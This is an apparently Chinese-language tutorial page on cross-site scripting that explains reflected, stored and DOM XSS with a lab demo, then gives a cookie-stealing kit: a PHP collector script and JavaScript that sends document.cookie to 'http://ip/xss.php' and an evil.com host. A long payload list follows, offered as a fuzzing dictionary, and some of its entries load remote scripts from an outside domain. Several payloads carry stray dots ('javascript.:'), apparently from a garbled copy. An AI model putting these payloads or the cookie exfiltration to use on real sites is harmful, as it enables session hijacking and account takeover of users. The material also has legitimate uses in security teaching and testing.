# XSS攻击

**[XSS攻击参考链接](https://www.cnblogs.com/liuhuan086/p/14741974.html)**

XSS攻击主要是针对用户进行攻击，产生的原因是网站应用程序输入验证存在缺陷，产生原因是服务端未对用户输入数据做过滤。



## 危害

*  盗用用户身份
* 未授权操作：未授权读取、篡改数据
* 按键记录和钓鱼
* 开启摄像头等



## 类型

* 反射型：非持久型，需要欺骗用户自己去点击链接才能触发漏洞。
* 存储型：持久型，攻击者把代码保存到数据库中，当用户访问存在漏洞的网页就会触发恶意代码。
* DOM型：DOM—based XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，DOM型是通过URL传入参数去控制触发的。



## 攻击示例

### 反射型

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820221000.png)

实施攻击

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820220925.png)

或者这样

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820221526.png)



### 存储型

在留言板中添加恶意代码，用来获取用户cookie，这样，黑客可以不用知道你的用户名和密码，也能够以你的账号信息做相关操作，比如给好友发送虚假信息，以你的名义转账或购买商品等。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820222734.png)

然后点击留言之后，会立即弹出该提示，并且每次访问该页面都会弹出来。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820222806.png)

### DOM型

DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。

在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过**JS脚本**对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用**JS脚本**来实现XSS漏洞的利用。

#### 靶机源码

```html
<html>
<head>
	 <meta charset="UTF-8">
	 <title>留言板</title>

	<script>
		var pos = document.URL.indexOf("name=")+5;
		document.write(document.URL.substring(pos,document.URL.length));
	</script>

</head>
<body>
<br>
这是一个dom xss测试
<body>
</html>
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820225842.png)

可以看到`?name=`后面的内容是我们可以控制和修改的

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820225927.png)

构造攻击语句并执行

```
http://192.168.50.75/target_sys.com/xss/xss03.php?name=<script>alert("hacker");</script>
```

发现在目前的chrome和edge中无法执行成功。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820231715.png)

找比较远古的ie浏览器来进行尝试，将浏览器中的`启用xss`筛选器禁用，则可以成功构造xss攻击。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820232559.png)



## 利用

### 盗取cookie

#### php

```php
<?php
    @ini_set('display_errors',1);
    $str = $_GET['joke'];
    $filePath = "joke.php";
	$handler = fopen($filePath, "a");
    fwrite($handler, $str);
	fclose($handler);
?>
```

#### js

```js
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://ip/xss.php?joke='+encodeURIComponent(document.cookie);
```

```js
var img=document.createElement("img");
img.src="http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);
```



### 构造语句

以下可以用来充当fuzz字典。

```
<script>alert('hello，gaga!');</script> //经典语句，哈哈！
>"'><img src="javascript.:alert('XSS')">
>"'><script>alert('XSS')</script>
<table background='javascript.:alert(([code])'></table>
<object type=text/html data='javascript.:alert(([code]);'></object>

"+alert('XSS')+"
'><script>alert(document.cookie)</script>
='><script>alert(document.cookie)</script>
<script>alert(document.cookie)</script>
<script>alert(vulnerable)</script>

<s&#99;ript>alert('XSS')</script>
<img src="javas&#99;ript:alert('XSS')">
%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e

%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
a.jsp/<script>alert('Vulnerable')</script>
"><script>alert('Vulnerable')</script>
<IMG SRC="javascript.:alert('XSS');">

<IMG src="/javascript.:alert"('XSS')>
<IMG src="/JaVaScRiPt.:alert"('XSS')>
<IMG src="/JaVaScRiPt.:alert"(&quot;XSS&quot;)>
<IMG SRC="jav&#x09;ascript.:alert('XSS');">
<IMG SRC="jav&#x0A;ascript.:alert('XSS');">

<IMG SRC="jav&#x0D;ascript.:alert('XSS');">
"<IMG src="/java"\0script.:alert(\"XSS\")>";'>out
<IMG SRC=" javascript.:alert('XSS');">
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<BODY BACKGROUND="javascript.:alert('XSS')">

<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript.:alert('XSS')">
<IMG LOWSRC="javascript.:alert('XSS')">
<BGSOUND SRC="javascript.:alert('XSS');">
<br size="&{alert('XSS')}">

<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer>
<LINK REL="stylesheet"HREF="javascript.:alert('XSS');">
<IMG SRC='vbscript.:msgbox("XSS")'>
<META. HTTP-EQUIV="refresh"CONTENT="0;url=javascript.:alert('XSS');">
<IFRAME. src="/javascript.:alert"('XSS')></IFRAME>

<FRAMESET><FRAME. src="/javascript.:alert"('XSS')></FRAME></FRAMESET>
<TABLE BACKGROUND="javascript.:alert('XSS')">
<DIV STYLE="background-image: url(javascript.:alert('XSS'))">
<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html&#39;);">

<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE='xss:expre\ssion(alert("XSS"))'>
<STYLE. TYPE="text/javascript">alert('XSS');</STYLE>

<STYLE. TYPE="text/css">.XSS{background-
image:url("javascript.:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE. type="text/css">BODY{background:url("javascript.:alert('XSS')")}</STYLE>

<BASE HREF="javascript.:alert('XSS');//">
getURL("javascript.:alert('XSS')")
a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);

<XML SRC="javascript.:alert('XSS');">
"> <BODY NLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
<SCRIPT. SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
<IMG SRC="javascript.:alert('XSS')"
<SCRIPT. a=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT.=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT. a=">"''SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT."a='>'"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PTSRC="http://xss.ha.ckers.org/a.js"></SCRIPT>

<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>
```

